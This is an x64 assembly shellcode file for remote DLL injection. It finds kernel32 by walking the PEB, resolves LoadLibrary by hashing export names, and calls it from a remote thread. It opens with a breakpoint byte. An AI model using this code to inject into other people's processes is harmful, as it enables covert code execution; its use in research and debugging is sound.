BITS 64

; This is shellcode for loading a custom DLL into another x64 process
; The code resolves Kernel32.dll through PEB and then the LoadLibrary function
; by walking the PEB, then it takes the argument that was passed and calls LoadLibrary
; This is intended to be called through xxxRemoteThread() functions.

SECTION .data

SECTION .text

global _start

_start:
	db 0cch
	push r8
	push r9
get_kernel32_base:
	mov rax, [gs:0x60]
	mov rax, [rax+18h]
	mov rax, [rax+30h]        
	mov rax, [rax]
	mov rax, [rax]
	mov r8, [rax+10h]
	
	xor r9, r9
	mov r9d, 0xec0e4e8e
	call resolve_symbol
	push rcx ; push lParam (pointer with the DLL String);
	call rax
	add rsp, 0x8
	
	pop r9
	pop r8
	xor rax, rax
	ret
	
resolve_symbol: ; (base dll, hashed function name)
	; first argument in r8, second in r9d
	push rdi
	push rcx
	push rbx
	push rdx
	xor rbx, rbx
	xor rcx, rcx
	xor rdi, rdi
	mov edi, [dword r8 + 0x3c]; // PE header
	mov edi, [dword r8 + rdi + 0x88]; // export section rva
	add rdi, r8;
	mov ecx, [dword rdi + 0x18]; //number of symbols of the dll
	mov ebx, [dword rdi + 0x20]; //rva symbol - Address of Names (RVAs)
	add rbx, r8;
search_iteration:
	test rcx, rcx;
	je search_failed;
	dec rcx;
	mov esi, [dword rbx + rcx * 4];
	add rsi, r8;
	;hashing the function name to comparison
compute_hash:
	xor rdx, rdx;
	xor rax, rax;
	cld;
compute_hash_again:
	lodsb;
	test al, al;
	jz compare_function;
	ror edx, 0x0d;
	add edx, eax;
	jmp compute_hash_again;
compare_function:
	cmp edx, r9d; //2nd argument -&gt; hashed name
	jnz search_iteration;
	mov edx, [dword rdi + 0x24]; Address of name ordinals
	add rdx, r8;
	mov ecx, [dword rdx + rcx * 2] ; get ordinal index
	and ecx, 0xffff
	mov edx, [dword rdi + 0x1c]; Address of functions
	add rdx, r8;
	mov eax, [dword rdx + rcx * 4];
	add rax, r8;	
	pop rdx
	pop rbx
	pop rcx
	pop rdi
search_failed:
	ret;